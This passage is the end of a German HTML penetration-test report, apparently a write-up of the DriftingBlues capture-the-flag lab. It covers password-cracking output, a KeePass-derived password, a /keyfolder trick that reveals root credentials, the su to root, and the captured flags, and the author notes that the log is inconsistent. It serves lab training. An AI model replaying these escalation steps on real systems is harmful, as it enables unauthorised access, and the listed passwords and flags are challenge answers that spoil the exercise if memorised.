+1g 0:00:00:09 DONE (2022-11-22 16:32) 0.1024g/s 708.1p/s 708.1c/s 708.1C/s russell1..julianne
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation (Root)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Die KeePass-Datei wird extern geöffnet. Es wird impliziert, dass darin die Root-Credentials gefunden wurden. Gleichzeitig beschreibt der Log einen seltsamen Mechanismus im Verzeichnis `/keyfolder`.</p>
+            <p class="evaluation"><strong>Bewertung: !!Root-Passwort aus KeePass (Impliziert) & /keyfolder-Mechanismus!!**
+                1.  **KeePass:** Es ist sehr wahrscheinlich, dass die KDBX-Datei die Root-Credentials enthielt (z.B. `root` / `imjustdrifting31`, wie im KeePass-Screenshot im Log erwähnt, obwohl der Log später ein anderes Passwort verwendet).
+                2.  **/keyfolder:** Der Log beschreibt dann, wie der Benutzer `gill` (obwohl dies `root` sein sollte, um den Besitz zu ändern) in `/keyfolder` wechselt und durch das Erstellen von Dateien (`touch fracturedocean` etc.) plötzlich die Datei `rootcreds.txt` erscheint. Diese Datei enthält `root` / `<span class="password">___drifting___</span>`. Dies deutet auf einen versteckten Mechanismus hin (Cronjob, inotify-Watcher?), der auf Dateierstellungen in `/keyfolder` reagiert und die Root-Credentials (oder zumindest *ein* Root-Passwort) in `rootcreds.txt` schreibt. Dieser Mechanismus ist der *im Log dokumentierte* Weg zur Eskalation, auch wenn das Passwort aus KeePass logischer wäre.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwende das Passwort aus `rootcreds.txt` (`___drifting___`) für den `su`-Befehl, da der Log diesem Pfad folgt.<br><strong>Empfehlung (Admin):**DRINGEND:** Untersuche und entferne den Mechanismus, der auf Dateierstellung in `/keyfolder` reagiert und Root-Credentials preisgibt. Ändere das Root-Passwort. Sichere die KeePass-Datei bzw. die darin enthaltenen Credentials.</p>
+             <!-- KeePass Info -->
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Kein Befehl, externe Aktion -->
+                     <pre>
+# KeePass-Datei (keyfile.kdbx) mit Passwort "porsiempre" geöffnet.
+# Annahme: Enthält Root-Credentials, z.B. root:imjustdrifting31
+                     </pre>
+                 </div>
+             </div>
+              <!-- /keyfolder Mechanismus -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+gill@driftingblues:~$ <span class="command">cd /keyfolder</span>
+gill@driftingblues:/keyfolder$ <span class="command">ls -la</span>
+total 8
+drwx---rwx  2 root root 4096 Feb 24  2021 . <!-- Berechtigungen erlauben Schreiben für Andere -->
+drwxr-xr-x 19 root root 4096 Feb 24  2021 ..
+gill@driftingblues:/keyfolder$ <span class="command">touch fracturedocean</span>
+gill@driftingblues:/keyfolder$ <span class="command">touch zakkwylde</span>
+gill@driftingblues:/keyfolder$ <span class="command">touch buddyretard</span>
+gill@driftingblues:/keyfolder$ <span class="command">touch 2real4surreal</span>
+gill@driftingblues:/keyfolder$ <span class="command">touch closet313</span>
+gill@driftingblues:/keyfolder$ <span class="command">touch exalted</span>
+gill@driftingblues:/keyfolder$ <span class="command">ls</span> <!-- Nach kurzer Zeit -->
+2real4surreal  buddyretard  closet313  exalted	fracturedocean	rootcreds.txt  zakkwylde <!-- Datei erscheint -->
+gill@driftingblues:/keyfolder$ <span class="command">cat rootcreds.txt</span>
+root creds
+
+imjustdrifting31 <!-- Widerspruch zum nächsten Schritt! -->
+<span class="password">___drifting___</span> <!-- Dieses Passwort wird im nächsten Schritt verwendet -->
+                     </pre> <!-- Passwort markiert -->
+                 </div>
+             </div>
+        </section>
+
+        <section id="poc">
+             <h2>Proof of Concept (Root)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `su root` wird ausgeführt. Das Passwort `<span class="password">___drifting___</span>` (aus der `rootcreds.txt`, die durch den `/keyfolder`-Mechanismus generiert wurde) wird eingegeben.</p>
+             <p class="evaluation"><strong>Bewertung: !!Privilegieneskalation erfolgreich!!** Der Wechsel zum Root-Benutzer gelingt mit dem Passwort aus `rootcreds.txt`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel erreicht. Lese die Root-Flag.<br><strong>Empfehlung (Admin):**DRINGEND:** Ändere das Root-Passwort. Entferne den `/keyfolder`-Mechanismus und die `rootcreds.txt`-Datei.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+gill@driftingblues:/keyfolder$ <span class="command">su root</span>
+Password: <span class="password">___drifting___</span>
+root@driftingblues:/keyfolder# <!-- Root Prompt -->
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Als Root wird ins Home-Verzeichnis gewechselt und die Datei `root.txt` gelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Root-Flag `<span class="password">9EFF53317826250071574B4D4EE56840</span>` wird erfolgreich gelesen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Test abgeschlossen.<br><strong>Empfehlung (Admin):</strong> Keine Aktion bzgl. Flag.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre>
+root@driftingblues:/keyfolder# <span class="command">cd</span>
+root@driftingblues:~# <span class="command">ls</span>
+key.sh	root.txt
+root@driftingblues:~# <span class="command">cat root.txt</span>
+<span class="password">9EFF53317826250071574B4D4EE56840</span>
+                      </pre>
+                 </div>
+             </div>
+        </section>
+
+        <!-- Flags Sektion -->
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <!-- Root Flag -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">9EFF53317826250071574B4D4EE56840</span></div>
+                 </div>
+                 <!-- User Flag -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/gill/user.txt</div> <!-- Pfad korrigiert -->
+                     <div class="flag-value"><span class="password">F83FC7429857283616AE62F8B64143E6</span></div>
+                 </div>
+             </div>
+         </section>
+
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus Nmap Scan extrahiert -->
+        <p>Berichtsdatum: 22. November 2022</p>
+    </footer>
+</body>
+</html>
